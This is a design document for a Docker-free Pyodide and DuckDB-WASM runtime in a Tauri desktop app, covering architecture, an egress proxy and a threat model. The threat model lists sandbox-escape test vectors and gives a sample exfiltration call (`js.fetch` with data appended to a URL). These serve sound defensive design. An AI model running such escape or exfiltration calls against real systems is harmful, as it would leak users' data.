# Pyodide + DuckDB-WASM: an optional, Docker-free execution runtime

**Status:** DESIGN v2.5 — **APPROVED TO BUILD PHASE 0.** Hardened through **four**
review rounds (v1, v2.1, the v2.3 §6a re-review, and a v2.4 final-gate at **A−,
GO**); all findings folded in (§13). The final gate verified every §6a fix closed
against code and confirmed internal consistency; its two nits (spike count, remote
flag ordering) and residuals (R1–R6) are folded into §6a/§7/§8/§10 here. Remote
reads are **day-0** via the Rust-core egress proxy (§6a), provenance +
terminating-fetch invariants pinned. Phase 0 = four spikes, 0(a) memory-ceiling is
the **value gate**; Phase 1a is CI-only; the no-Docker UX is gated on the §7 escape
suite (incl. nine §6a vectors). Microsandbox assessed and **rejected** (§13).
**Date:** 2026-08-26

> **Settled product decisions (2026-08-26).**
>
> 1. **Scope = GUI/desktop only.** No-Docker execution targets the desktop app;
>    headless MCP/CLI keep Docker (they have no browser sandbox). This is now a
>    hard non-goal, not an open question.
> 2. **Delivery vehicle = Tauri desktop app.** The webview _is_ the §7 security
>    boundary; the untrusted-execution worker lives inside it. See §4a.
> 3. **Execution stays orchestrated by a Node sidecar; only the execute (and
>    schema-extract) step is handed to the sandboxed webview worker over local
>    IPC.** This keeps the orchestrator retry/review loop intact server-side and
>    turns the PE review's "N client↔server round-trips" into **local same-machine
>    IPC** — a materially smaller inversion than v2 assumed. See §4a.
>    **Owner seams:** `src/lib/constants.ts` (runtime registry), `src/lib/sandbox/*`
>    (executor + capability gate + routing), `src/lib/pipeline/orchestrator.ts` (the
>    execute/retry/review loop), `src/lib/llm/prompts.ts` (codegen contract),
>    `src/middleware.ts` (the CSP that turns out to be load-bearing here).

> **Review adjudications (v1 → v2).** The security review refuted v1's central
> thesis — Pyodide's `import js` FFI is identical in a **browser** worker, and the
> **live app CSP** (`middleware.ts:154`) allowlists `huggingface.co`,
> `*.cartocdn.com`, `localhost`, and `'self'`, so v1's "safe by construction / no
> network / data never leaves the machine" was an overclaim; exfiltration is
> **open** under the real CSP. §7 is rewritten around the actual boundary. The PE
> review showed v1 badly understated Option B's cost (the executor sits inside a
> **stateful server-side retry/review loop** with six other call sites, several
> headless), and that "pandas-first, DuckDB unavailable" **fights the codebase's
> own memory-safety design** (DuckDB's disk-spill is the OOM valve). §4/§5/§6/§10
> are re-scoped accordingly, and a pragmatic **Phase 1a (Node-worker, CI-only)**
> is added.

---

## 1. Why

Hermetic today has exactly one sandbox runtime — **Docker** — and it is the
_entry toll_. A machine with no Docker reports every runtime `available: false`
and simply **cannot execute** (`specs/archive/testing/tier-1-smoke-test-report.md:105`).
For the audience we want — a **non-technical end user who downloads, unzips, and
runs** — Docker is the wall they never get over.

A Pyodide (CPython-on-WASM) + DuckDB-WASM runtime removes that wall for the
common case: Python analysis runs in a WebAssembly VM, and — _with the controls
in §7_ — the executed code can be denied host access and network egress, making
Docker the **power-tier** (parquet, remote/warehouse, big-data) instead of the
cost of admission. This is the linchpin of a true "download and run" desktop app.

**What this is NOT (corrected from v1):** it is not "safe by construction." WASM
removes _syscalls_, but a Pyodide runtime is embedded in a JS host (Node global
or a browser worker global) whose ambient capabilities Python reaches via
`import js`. The isolation is real only if we **affirmatively remove** those
capabilities and **prove** their absence (§7). The value proposition survives —
but as an _enforced_ boundary, not a free one.

## 2. Goals / non-goals

**Goals**

- A **second** `SandboxRuntimeId` (`wasm`) behind the existing `executeSandbox`
  dispatcher, selected automatically when Docker is absent (and selectable when
  present).
- Cover the **local-CSV analytical core** with the same output contract, the same
  `hermetic_runtime` stats package, and the same rendered dashboards.
- **Remote reads (https/s3/gs) that fit the memory envelope are DAY-0** (§6a) —
  "point it at your bucket / a public Parquet URL" works without Docker, via a
  trusted Rust-core egress path, not by loosening the worker. This is a scoping
  choice, deliberately pulled forward.
- Preserve isolation at Docker's level **for the analyses it accepts**, enforced
  and tested. **Reject, never silently degrade.**

**Non-goals (v1 of the runtime)**

- Not replacing Docker (it stays the power-tier).
- **Not LARGE data** — local _or_ remote, above the memory cap (§5/§6). This is
  physics (DuckDB-WASM is single-threaded, no disk-spill, no httpfs range-scan),
  not a policy choice; huge datasets route to Docker forever. Note this is a
  SEPARATE axis from "remote": a normal-sized S3 object runs in WASM day-0; a
  2.5-billion-row Overture dataset does not.
- **Not headless no-Docker.** MCP (`src/mcp/*`) and CLI (`src/cli/*`) are Node
  processes with no browser/webview, so the secure (browser-sandbox) placement
  cannot serve them. On headless hosts, no-Docker execution is **out of scope**;
  Docker remains required there. The no-Docker promise holds for the **GUI /
  desktop (Tauri) path only** — state this to users, don't imply otherwise. _(PE
  F1.)_
- Not a browser-only rewrite of the app.
- Not statsmodels/lifelines/networkx-dependent codegen — all three are named to
  the model (`prompts.ts:316,319,325`) but absent from the image, i.e. already
  latent ImportErrors; the WASM codegen variant prunes those chart families. _(PE
  F8.)_

## 3. The integration seam (reuse — verified against code)

The runtime abstraction was built for this; adding `wasm` is a data-driven
extension. Verified attach points (paths corrected from v1):

1. **`src/lib/constants.ts:174`** `AVAILABLE_RUNTIMES` gains `{ id: "wasm", … }`;
   `SandboxRuntimeId` derives it. (Today it has **one** member, `docker`; `wasm`
   is the **second**.)
2. **`src/lib/sandbox/capabilities.ts:39`** `RUNTIME_CAPABILITIES` is an
   exhaustive `Record<SandboxRuntimeId,…>` — the compiler **forces** a `wasm`
   entry. Its `supportsNetworkPolicy` is the load-bearing flag (§7): it may be
   `true` **only** once the §7 controls exist and the escape suite is green.
3. **`src/lib/sandbox/index.ts:89`** `planSandboxRouting()` (pure, unit-tested)
   gains `wasm` plan kinds; **and** `executeSandbox()`'s translator
   (`index.ts:164-218`) needs a **new dispatch branch** — every current plan kind
   funnels to `dockerExecutor`, incl. the `ephemeral` fallback hardcoded with
   _"Docker is the only runtime."_ Two edits, not one. _(PE F4.)_
4. **Executor**: `(csvContent, code, opts) => Promise<ExecutionResult>` alongside
   `docker-executor.ts`, reusing **`parseSandboxOutput(opts)`**
   (`parse-output.ts:176`) via a `readFile` closure over the WASM virtual FS —
   the entire findings/series/datasets/regimes decode path is reused verbatim.
5. **Warm pool** (later): implement `WarmSandboxBackend` (`warm-backend.ts:11`),
   register in `ensureBackendRegistered` (`warm-sandbox.ts:249`).

**Not clean — must be handled:** the execute call is **not** a single site. It
runs inside a **stateful server-side loop** in `orchestrator.ts`: pre-exec
`reviewAndRevise` (`:291,:404`) → execute (`:433`) → semantic verdict → a
**retry loop** (`MAX_RETRIES=3`, `:490`) that re-executes (`:578`) with fresh
server LLM calls between attempts → edit re-exec (`:727`). Plus six other
callers: `history/[id]/refresh`, `vizs/[id]/rerun`, `vizs/[id]/refresh`,
`mcp/deps.ts` → `mcp/tools/run-analysis.ts`, and the multi-step
`investigate-orchestrator.ts`. This loop is what makes Option B expensive (§4).
Also Docker-only: `parquet/materialize.ts` (throws unless docker, ~~`:46`),
`parquet/schema-extractor.ts` (hardcoded `run("docker",…)`), and the large-data
branch in `sources/ingest.ts` (~~`:248`).

## 4. THE decision: where does Pyodide run?

All execution is server-side Node today; the browser only applies JSON-Patch
deltas. Two placements:

### Option A — Node `worker_thread` (server-side)

Fits boot, path roots, data staging, the NDJSON stream, and **the headless
harnesses (CLI/MCP)** unchanged — the smaller build. **But** Pyodide's `js` FFI
reaches the Node global: `import js; js.process` / `require("child_process")` /
`fetch` — a **host escape** (arbitrary code/file/exec on the user's machine).
Closing that is a deny-list-shaped, never-finished problem.

### Option B — Browser / webview worker (client-side)

The origin sandbox denies host FS/process/`require`. **But** — corrected from v1
— it is **not** automatically network-isolated: the browser worker global
ambiently exposes `fetch`/`XMLHttpRequest`/`WebSocket`/`importScripts`/OPFS, all
reachable via `import js`, and the **live app CSP** (`middleware.ts:154`:
`connect-src 'self' … https://huggingface.co http://localhost:* http://127.0.0.1:*`

- basemap wildcards; `img-src data: blob:`) would **permit exfiltration** of the
  user's CSV today. So Option B's boundary is **CSP + FFI policy**, not a
  structural absence of network — and its cost is architectural: the executor
  sits inside the server-side retry/review loop (§3), so client-side execution
  turns one run into **N client↔server round-trips** (code + `output.json` over the
  wire each retry, server LLM calls interleaved), and Investigate must persist
  `step_N.csv` frames client-side across steps. The Tauri webview that is both the
  security foundation and the product vehicle **does not exist in the repo yet**
  (no tauri/electron dep; Phase 3).

### Recommendation (rationale corrected)

**Target Option B for the untrusted GUI/desktop path — not because it is "safe by
construction," but because host escape (A: `process`/`require`/Tauri-`invoke`) is
_categorically worse_ than data exfiltration, and exfiltration is _closeable_ by
a strict per-context CSP + FFI scrub (§7) that A's `process`/`require`
reachability never can be.** Both reviews independently endorsed B on these
grounds.

**But sequence it to decouple the two hard things.** The PE review's pragmatic
middle, adopted:

- **Phase 1a — Option A, gated to CI/parity only.** Build the executor +
  capability entry + routing + a **Node worker** that runs Pyodide, used **only**
  by the parity/isolation test harness and behind an off-by-default flag — never
  a user egress path. This hardens "does WASM compute correctly and does the
  capability gate reject correctly" in CI, reusing exactly Phase 0's code,
  **without** inverting the orchestrator loop and **without** trusting the
  Node-FFI boundary for real user data (A is test-only here, so T1 doesn't gate).
- **Phase 1c — Option B, the client-execution inversion** — is the separate,
  larger project that ships the actual no-Docker user experience, and it lands
  only once §7's controls + the in-browser escape suite are green and (ideally)
  the Tauri shell exists.

## 4a. Tauri architecture & the execution handoff (settled vehicle)

Committing to Tauri resolves the placement tension cleanly, because it gives us
_three_ isolated contexts on one machine instead of a server/client split:

```
┌─────────────────────────── Tauri app (one process tree) ───────────────────────────┐
│                                                                                      │
│  Rust core ── spawns ──▶  Node sidecar (TRUSTED)          Webview (untrusted content)│
│  (window, updater,        · the whole lib pipeline:       · the Next UI (served by    │
│   fs/shell perms:          runAskQuery / orchestrator      · applies the patch stream │
│   DENIED to webview)       (code-gen, review, retry,      · hosts the EXECUTION      │
│                            compose) — UNCHANGED             WORKER (a dedicated Web   │
│                          · LLM calls, storage, boot        Worker running Pyodide +  │
│                          · NEVER runs untrusted Python     DuckDB-WASM) ◀── §7 sandbox│
│                                    ▲   │                          ▲                   │
│                                    │   │ execute(code, dataRef)   │                   │
│                                    │   └──────────local IPC───────┘                   │
│                                    └─────────output.json envelope─┘                   │
└──────────────────────────────────────────────────────────────────────────────────────┘
```

**Who runs what:**

- **Node sidecar = the trusted orchestrator.** The entire existing pipeline
  (`orchestrator.ts` retry/review loop, code-gen, compose, storage, boot
  contract, LLM calls) runs here **unchanged**. It reuses the whole lib as-is —
  no boot/path/`process.env` rework. Critically, **it never runs untrusted Python
  itself** (that would be Option A's FFI escape); it _delegates_ the execute step.
- **Webview execution worker = the untrusted sandbox.** A dedicated Web Worker in
  the webview loads Pyodide + DuckDB-WASM and runs the LLM-generated code under
  the four §7 controls. This is the browser-origin sandbox — the real boundary.
- **The handoff.** At `orchestrator.ts:433/:578` (and schema extraction), instead
  of calling `dockerExecutor`, the `wasm` executor sends `{code, additionalFiles,
dataRef}` to the webview worker over **local IPC** and awaits the `output.json`
  envelope, then feeds it to `parseSandboxOutput` exactly as today. The retry loop,
  review gate, and semantic validation stay in the sidecar. Investigate's
  `step_N.csv` frames live in the worker's MEMFS across steps, keyed by run.

**Why this beats v2's "invert everything":** the round-trips the PE review flagged
(F1) are now **same-machine IPC**, not client↔remote-server hops; the orchestrator
loop is untouched; and the only genuinely new control-flow is "the execute step is
async-remote to a worker" — which the executor contract (`Promise<ExecutionResult>`)
already models. The cost drops from "re-architect the pipeline" to "add an
IPC-backed executor + the worker + the §7 controls."

**Schema extraction & ingest also move to the worker.** `parquet/schema-extractor.ts`
and the large-data materialize path (`sources/ingest.ts`) are Docker-hardcoded; the
no-Docker path needs their DuckDB-WASM equivalents **in the same worker** (schema
from a `DESCRIBE`/profiling query; the row-cap replaces materialization). This is
real added scope, tracked in Phase 1b.

**Boot / no-Docker detection.** The sidecar boots via the existing harness
contract (`setPathRoots`, `installEnvConfig`) with roots under the Tauri app-data
dir. `getActiveSandboxRuntime()` resolves `wasm` when Docker is absent (§11).

**Transport — the real architectural work (both re-reviews' F1).** This is a
**server→client inversion**, not "reuse the localhost channel." Today the webview
does a main-thread `fetch()` to the sidecar and reads a streamed NDJSON body
(`hooks.ts:265`) — a browser→server request. Here the **trusted sidecar must call
outward into code living in the webview and block on its reply** (`orchestrator.ts:433`).
Servers don't call clients, so a genuinely new **bidirectional** protocol is
required, and two hard constraints pin its shape:

- The exec worker runs under `connect-src 'none'` (§7 #2), so it **cannot `fetch`
  localhost and cannot answer a localhost request** (a worker is not a server).
  Therefore the transport is **`postMessage`-only, relayed through the main thread**:
  the main thread is the sole holder of the sidecar channel (WebSocket / long-poll /
  a job the webview claims) and the sole resolver of `dataRef → bytes`; it
  `postMessage`s `{code, bytes}` into the worker and receives the `output.json`
  envelope back. `execute(code, dataRef)` where the worker resolves the ref is
  **impossible** — data must be pushed as bytes. The main-thread relay accepts
  **only** the strict envelope (§7) and never forwards raw worker messages.
- **Liveness/trust coupling that does not exist today.** The sidecar now blocks on
  an untrusted, reloadable, closable webview to make forward progress. A webview
  reload mid-run destroys the worker's MEMFS mid-retry — today a reload loses
  nothing (state is server-side). The protocol must handle worker-not-ready,
  webview-reload-mid-run (fail the run, or re-ship state to a fresh worker?), and
  sidecar-blocks-on-dead-webview timeout. **A transport prototype is the
  load-bearing Phase-0 unknown — more than the escape suite.**

**Concurrency (both re-reviews' F3).** `investigate-orchestrator.ts` runs
sub-questions **in parallel dependency waves** (`Promise.all`); six other callers
(`vizs/[id]/refresh|rerun`, `history/[id]/refresh`, `query/rerun`, MCP
`run-analysis`, scheduler) can also fire concurrently. One worker with a fixed-path
MEMFS (`/data/step_N.csv`) either **serializes** these (a latency regression vs
Docker's per-run container) or **races/corrupts** MEMFS. The design must state a
concurrency model: a small **worker pool** (N workers) or explicit serialization
with the latency cost named. This is not a Phase-2 nice-to-have — parallel
Investigate is shipped behavior.

**Two v2.1 descriptions corrected (PE):** the webview does **not** host a _static_
UI — the app is not `output:'export'`-able (30+ API routes, server components,
native `@napi-rs/keyring`/snowflake/databricks addons), so the webview loads the
server-rendered app from the **sidecar's localhost origin**, and the sidecar is a
bundled per-platform **Node runtime + standalone Next server + native `.node`
addons** spawned as a Tauri `externalBin` — real packaging work (Phase 0c), not
"reuse as-is." And the CSV is **not** retained in the browser after upload (it's
POSTed to the sidecar and stored server-side, `csv/storage.ts`), so per-run
sidecar→worker **data shipping is real**, not free — see §8.

## 5. Capability matrix (what the WASM tier accepts vs. rejects)

The matrix has **two independent axes** — _source location_ (local vs remote) and
_size_ (fits the memory envelope vs doesn't). Only size is a hard wall.

**Accepted in the WASM tier:**

- **Runs unchanged in Pyodide:** the entire `hermetic_runtime/` package (pure-`math`
  p-value machinery, regime matrix, findings/series/values, `write_output`);
  pandas/numpy/scipy/scikit-learn as Pyodide wheels; the `/data` MEMFS contract;
  DuckDB SQL syntax (via §6).
- **Remote reads (https/s3/gs) within the size cap — DAY-0** (`supportsRemoteIO:
true`, via the Rust-core egress path in §6a, NOT worker `fetch`). The bytes are
  fetched by the trusted core and land in MEMFS as a local file.
- **Warehouse pulls (ClickHouse/Hive/BigQuery/Snowflake/Databricks/Trino/Postgres)
  — supported, and NOT a sandbox concern.** The query runs in the **Node sidecar**
  via the native driver (scan-window-bounded by `runWarehouseQuery`), returning
  CSV; the worker analyzes it like a local file with **no sandbox egress** (the
  sidecar's own network reaches the warehouse; the §6a proxy is not involved). The
  `wasm` run takes the CSV path automatically — `materialize-result.ts:76` already
  gates the Parquet materialization on `sandboxRuntime === "docker"`. Only the
  RESULT's size matters (next bullet); a large pull's Parquet materialization is
  Docker-only today, replaced no-Docker by the in-worker DuckDB-WASM materialize
  (Phase 1b-ingest). **Packaging note:** the sidecar bundle must include the
  warehouse drivers' native components (`hive-driver`/thrift, `snowflake-sdk`,
  etc.) alongside `@napi-rs/keyring` — folded into the Phase 0(c) native-addon
  bundling proof.

**Rejected → Docker (or refused when Docker absent, with clear messaging):**

- **Anything above the memory cap** (local, remote, OR a large warehouse result) —
  DuckDB-WASM is single-threaded with no disk-spill, so the WASM heap has no OOM
  valve; the tier **caps input size** and rejects above it (`supportsMount`/big-data
  via Docker's `>=100k`-row Parquet path stays Docker-only). The cap is a
  first-class capability, **measured in Phase 0(a)** (`spikes/wasm-phase-0/`):
  read_csv → groupby ran clean to **400 MB / 5.3M rows** (WASM heap ~1.45 GB;
  wasm32 ~2 GB is the wall at ~3.6× heap:CSV), so the cap is set **~250–300 MB** —
  far above a normal personal dataset. The value-proposition gate (§10) is
  **GREEN**.

**Codegen consequence.** A no-Docker user has no fallback, so the WASM tier needs
a **codegen prompt variant** that stays in-envelope: DuckDB-WASM-shaped SQL (§6),
remote reads expressed as reads of a **core-fetched local MEMFS file** (§6a) — not
in-worker `httpfs`, no spill/thread PRAGMAs, native charts only (prune
statsmodels/lifelines/networkx/seaborn-PNG families), and an explicit "data too
large for the in-browser engine" path. The capability gate remains the backstop,
but is a **UX router, not a security control** (§7, T5).

## 6a. Remote reads via the Rust-core egress proxy (day-0)

The Docker egress model, reborn in the Tauri core. The **worker stays at
`connect-src 'none'` and DuckDB-WASM keeps httpfs OFF** (§7's structural block is
untouched); the trusted core is the egress boundary. The v2.3 security re-review
(grade B−) confirmed the architecture is sound but the invariants were stated too
loosely; v2.4 pins them.

**The provenance invariant — everything rests on this (re-review #1).** Docker
pins the allowlist to the run's **stored, out-of-band-declared** source
(`orchestrator.ts` passes `csvId = schema.csv_id`; `index.ts` reads
`getStoredCSV(csvId).remoteParquetUrl`; `egressPolicyFor(STORED_url)` derives the
hosts; generated `code` can only NARROW via `codeNeedsNetwork`, never widen —
`routing.test.ts`). The Rust core MUST replicate this, and — because it is
**long-lived and shared** (unlike Docker's per-run, torn-down gateway) — it must
resist **two** things the untrusted worker controls:

1. **The allowlist is derived from the STORED source URL, never the worker's URL.**
   The worker-supplied URL is honored **only if its host ∈
   `deriveAllowedEgressHosts(stored source URL)`**; its path is treated as an
   **opaque object key** within an allowlisted host. Deriving the allowlist from
   the URL the worker just asked for would be circular and useless.
2. **The run's authorized `source_id` is established out-of-band by the SIDECAR,
   never accepted from the worker.** The sidecar (which alone knows the run's
   `csvId`) tells the core "this run may fetch source S"; the core rejects any
   fetch whose source ≠ S. Otherwise injected code in run A — **even a local-CSV
   run** — could name any _other_ remote source the user ever connected and get
   egress + that source's creds: a cross-source confused deputy the per-run Docker
   gateway is structurally immune to. This restores Docker's per-run scoping and
   is what keeps the **local-run `connect-src 'none'` guarantee true** (a local run
   has no authorized source → the core refuses every fetch).

**Not a "direct port" — a terminating fetch is a different architecture
(re-review #2).** `egress-proxy.py` is a CONNECT proxy: opaque TLS, host-only
filter, no redirects/bodies, end-to-end certs. A Rust `fetch` terminates TLS and
sees everything, so the port must add guarantees the tunnel got for free:

- **No auto-redirects.** Reject 3xx, **or** re-run the full allowlist +
  resolve-and-reject on **every hop** (a same-host redirect can still rebind).
  (Legit S3 regional 301/307 fails unless the region was declared — same limit as
  Docker; a functional test covers it.)
- **Standard cert validation** — no accept-invalid, no custom CA (moot for Docker's
  end-to-end TLS, load-bearing here).
- **RFC-1918 policy is a DECISION, not an inheritance.** `egress-proxy.py`
  _allows_ RFC-1918/CGNAT at connect time (on-prem/self-hosted is legitimate),
  blocking private ranges only at name-derivation. For a **desktop** app the
  user's LAN is a threat, so the core **rejects resolved RFC-1918** — deliberately
  **stricter** than Docker (this breaks on-prem endpoints; acceptable for the
  non-technical target, stated not hand-waved).
- **Per-request derivation, no cross-run/cross-source caching** (ties to the
  provenance invariant).
- **Read-only GET only (re-review #3).** The core never honors a worker-supplied
  HTTP verb — no attacker-driven PUT/write. Residual (equal to Docker): injected
  code controls the query, so it can smuggle local data _in the query to the
  user's own source host_; bounded to that one host, never elsewhere.

**Download size cap — engineered, not asserted (re-review #4).** The §7 read cap is
on `output.json` (worker→sidecar); this is the **other** direction. The core must
**count bytes as they stream and hard-abort the connection at N** (where **N ≈ the
§5 memory cap** — a remote object that won't fit the WASM heap should abort at the
core, not after transfer), treat `Content-Length` as **untrusted** (never
pre-allocate/trust it), and bound bytes **before they reach MEMFS**. A malicious
source serving a chunked multi-GB body must not OOM the core.

**Why this is parity-or-better with Docker's allowlist tier:**

- Same guarantee — injected code reaches the **authorized source host only**, never
  an attacker host, metadata, or (here, stricter) any resolved private range.
- **Credentials never enter the untrusted worker** — verified genuinely stronger
  than Docker, where `applyRemoteAuth` splices creds into the `CREATE SECRET` SQL
  that runs _alongside_ in-container code. Here the worker never sees credential
  bytes at all.
- **No CORS wall** and real **resolve-and-reject** — the two things a
  loosened-worker-CSP approach structurally can't do.

**Costs (honest):** makes the async bridge (§6) + **COOP/COEP** foundational; needs
the Rust egress component (`egress-proxy.py` is the reference, but with the
terminating-fetch additions above); ties remote reads to the **Tauri** build.
Large objects are still bounded by the memory cap → huge remote Parquet routes to
Docker (the size axis, not the remote axis).

## 6. The DuckDB question (re-scoped after PE F2)

Generated code leans on `import duckdb` **as its memory-safety strategy**:
`prompts.ts:373-377` — _"DuckDB does the heavy lifting… it streams from disk and
won't run out of memory… NEVER load two large frames into pandas and `pd.merge` —
that cross-joins in memory and crashes"_ — and `:842` _"DuckDB SQL (it spills to
disk)."_ So v1's "pandas-first, DuckDB unavailable" is not a mild ergonomic
loss; it **removes the OOM valve while shrinking the heap** — the worst
combination. Corrected decision:

- **Phase 1 ships the DuckDB-WASM shim** (a thin Python `duckdb` proxying
  `.sql()/.df()` to a DuckDB-WASM instance over local MEMFS files), **not**
  pandas-first — so the model's memory discipline still holds. Pandas-first over
  uncapped local CSVs is explicitly rejected.
- **The sync/async impedance mismatch is the shim's hard problem, not a detail
  (PE F2).** Generated code calls `duckdb.sql(q).df()` **synchronously** (pandas
  style, `prompts.ts:372-378`); DuckDB-WASM's API is **async/Promise-based**. A
  synchronous Python call cannot await a JS Promise without one of two strategies,
  which §6 must **choose and cost now**:
  - **(A) `SharedArrayBuffer` + `Atomics.wait`** — the Python worker blocks on a
    SAB while DuckDB runs in a _second_ worker. Requires **cross-origin isolation
    (COOP/COEP headers)** the app does not set today and which interacts with the
    Tauri custom-protocol/CSP setup; COOP/COEP is _also_ the prerequisite for any
    Pyodide/WASM threading. **This is the recommended path** (keeps the existing
    synchronous codegen contract intact) — but its infra (COOP/COEP + a
    DuckDB-in-second-worker) must be proven in **Phase 0(b)**.
  - **(B) rewrite the codegen contract to `await`** every `.sql().df()` inside
    `runPythonAsync` — a prompt-contract change touching the WASM codegen variant,
    avoiding SAB/COOP but diverging the two runtimes' generated code.
    This item is load-bearing enough to be **its own phase (1b-shim)**, not one
    bullet among four.
- The DuckDB-WASM build is compiled/configured **without `httpfs` and with no
  `fetch` bridge instantiated** — its JS object is untrusted-reachable via
  `import js`, so "remote → Docker" must be a **structural** block at the WASM
  layer, not just the regex gate. A test asserts `read_parquet('https://…')` /
  `INSTALL httpfs` **fails at the WASM layer**. _(security.)_
- Combined with the §5 row/byte cap for the residual cases the shim can't stream.

## 7. Security & threat model (rewritten — the review's main target)

**The boundary is enforced, not structural, and it does not end at the worker.**
The v2.1 reviews' key correction: sandboxing the exec worker is necessary but
**insufficient**, because the worker's _output_ (findings/series/results/datasets/
images — all `z.unknown()` pass-through in `parse-output.ts:29-49`) is laundered
back into the **trusted** compose LLM prompt (`dashboard-compose-prompt.ts:139,320`)
and then **rendered on the main thread under the permissive app CSP**
(`middleware.ts:154`, which allows `connect-src huggingface.co`/`localhost:*` and
`script-src 'unsafe-inline' 'unsafe-eval'`). So the boundary spans **three** places,
enforced by these controls; only after **all** are proven by the ship-gating suite
may `RUNTIME_CAPABILITIES.wasm.supportsNetworkPolicy` be set `true`:

1. **Dedicated Worker, never the main thread.** Untrusted Python runs only in a
   dedicated Web Worker. On the main webview thread `import js` reaches
   `window.__TAURI_INTERNALS__.invoke` (any exposed Rust command) — full host
   escape. Hard requirements: Tauri `withGlobalTauri:false` and a webview
   capability set that grants **no** fs/shell/http/dialog/os/custom commands to the
   execution origin (Electron equivalent: `contextIsolation:true, sandbox:true,
nodeIntegration:false, nodeIntegrationInWorker:false`).
2. **The exec-context CSP is THE load-bearing network control** (not the FFI
   scrub — see #3). The worker document carries **one** policy, written once:
   `default-src 'none'; script-src blob: 'wasm-unsafe-eval'; connect-src 'none';
img-src 'none'; worker-src 'none'; child-src 'none'`. **`script-src` must NOT
   include `'self'`** — the Phase 0(b) escape suite
   (`e2e/wasm-escape-suite.spec.ts`, run in real chromium) PROVED that `'self'`
   permits same-origin `importScripts()` / dynamic `import()` to an attacker-chosen
   URL — a real exfil channel (data rides the URL; the request leaves even though
   the "script" never executes, because `connect-src 'none'` does NOT govern script
   loads). Pyodide is loaded from **pre-fetched `blob:` URLs**, so `script-src blob:`
   runs it while blocking same-origin script-URL egress; `'wasm-unsafe-eval'`
   permits `WebAssembly.compile` only. `worker-src/child-src 'none'` blocks the
   `new Worker`/iframe **fresh-realm** escape. This holds regardless of any captured
   JS reference (proven in-browser: a `fetch` reference saved before any scrub is
   still CSP-blocked), so it — not the scrub — is what proves "no egress."
3. **FFI global-scrub = defense-in-depth ONLY.** Deleting `fetch/WebSocket/…` from
   the worker global before user code is a **denylist** and cannot prove absence
   (captured refs, `Function('return this')()`, `self.constructor`, getters,
   Pyodide's own `pyodide.globals`/`create_proxy` re-entry all defeat it) — the
   exact never-finished problem we reject for Option A. It stays as a second layer,
   but the suite must prove **fetch still fails with the scrub disabled** (i.e. CSP
   #2 alone blocks egress).
4. **DuckDB-WASM without httpfs/fetch inside the worker** (§6) — the worker itself
   has **no** egress channel. Remote reads (§6a) are performed by the **trusted
   Rust core**, never the worker: the worker can only _request_ a URL, and the core
   enforces the source-host allowlist + resolve-and-reject + creds. The worker's
   `connect-src 'none'` is unchanged; the egress boundary simply moves to a trusted
   component, exactly as Docker moves it to the L7 proxy. **T6 — the Rust egress
   core is in-scope**: it must port `egress-proxy.py`'s guarantees faithfully
   (vhost-only allowlist, no cross-host redirect, internal-IP rejection, creds
   applied server-side) and is covered by the isolation suite (a worker request to
   a non-allowlisted host, a rebind, a redirect-to-internal must all fail at the
   core).
5. **The compose + render contexts are in-scope.** Untrusted worker output reaches
   the trusted composer's prompt (second-order prompt injection) and renders on the
   main thread under the app CSP. Two required mitigations: **(a) clamp worker
   output at the `parseSandboxOutput` boundary** — the `findings/series/values`
   registries are intentionally open `z.unknown()` (`parse-output.ts:38-49`; a
   type-closed schema would silently strip unlisted declarations — the v1 loss
   CLAUDE.md pins), so the clamp is **depth/size/breadth/count bounds** on the
   envelope, keeping the registries open-but-capped, with downstream
   `lib/findings`/`lib/product` remaining the semantic gate against _adversarial_
   input; and **(b) tighten the
   rendered-dashboard / desktop app CSP** to drop `huggingface.co` and constrain
   `connect-src`/`img-src` for the packaged build, so a laundered payload can't
   beacon even from the render thread. `parseSandboxOutput` is a **shape gate, not
   a trust boundary** (`parse-output.ts:29-49` validates types only) — downstream
   `lib/findings`/`lib/product` validation is load-bearing against _adversarial_,
   not just malformed, input.

**Also required, tied to the transport (§4a):**

- **The main-thread relay accepts ONLY a strict `output.json` envelope** from the
  worker (via `parseSandboxOutput` after the #5 clamp) and **never forwards raw
  worker `postMessage` data** onward to the sidecar. Because the transport is
  `postMessage`-only (§4a/F1), `postMessage`-to-parent is a **mandatory** channel
  the worker will always have; the relay's allowlisting is what stops it becoming
  exfil.
- **A read cap on `output.json`** in the WASM `readFile` closure (mirroring the
  Docker byte budget). Without it a malicious multi-hundred-MB envelope OOMs the
  **sidecar** — `parseJsonWithPythonNonFinite` (`parse-output.ts:165`) `JSON.parse`s
  the whole document; T3's worker heap cap does not protect the sidecar.

**The escape suite (ship-gating, in the real webview under the exec CSP).** Each
must FAIL from executed Python: `import js; js.fetch(...)` · `js.XMLHttpRequest` ·
`new js.WebSocket(...)` · `js.importScripts(...)` · `js.eval`/`js.Function` ·
`js.WebAssembly.compile` · `js.indexedDB`/`js.caches`/`navigator.storage`(OPFS) ·
`<img>`/`fetch` pixel beacon · `js.__TAURI_INTERNALS__`/`js.__TAURI__` presence ·
`new js.Worker(...)`/iframe **fresh realm** · FS path outside MEMFS ·
`duckdb: INSTALL httpfs`/`read_parquet('https://…')` · **worker posts a
non-envelope / oversized message → relay drops it, never forwards** · **`fetch`
still fails with the FFI scrub disabled** (proving #2 alone holds).

**Plus the §6a remote-egress vectors (T6), each must FAIL at the Rust core:**
(1) a run authorized for source A whose worker requests `source_id = B` → rejected
(cross-source confused deputy — the highest-value test); (2) a **local-CSV run**
whose worker posts _any_ fetch → refused (proves `connect-src 'none'` parity holds
with remote enabled); (3) a worker URL whose host ∉ the stored-source-derived
allowlist → rejected (proves derivation is from the stored source, not the worker
URL); (4) an oversized/chunked/forged-`Content-Length` response → core hard-aborts
at the byte ceiling; (5) a 3xx → internal, and 3xx → same-host-rebound → rejected
per hop; (6) a worker-requested non-GET / write verb → core does read-only GET
only; (7) the worker never receives credential bytes in any postMessage/MEMFS
artifact; (8) a stored `s3://bucket/…` never yields generic `s3.amazonaws.com`
reachability (vhost-only); (9) a public host that _resolves_ to a LAN address →
rejected (the desktop RFC-1918 policy, §6a). Green suite (all of the above) is a
precondition for `supportsNetworkPolicy: true` **and** `supportsRemoteIO: true`.

Independent cheap hardening (do regardless): add a `__proto__`/`constructor`/
`prototype` segment guard to the spec-patch `setByPath`/`addByPath` — compose
output (attacker-influenced via #5) currently walks path segments unguarded, a
prototype-pollution sink on the render thread. _(security F8.)_

**Threats (revised):**

- **T1 — Host escape.** Node `js`→`process/require` (Option A) and
  webview-main-thread `js`→Tauri `invoke` (Option B done wrong). Controlled by
  keeping A test-only (§4) and control #1.
- **T2 — Exfiltration.** `import js; js.fetch("https://huggingface.co/x?d="+…)`.
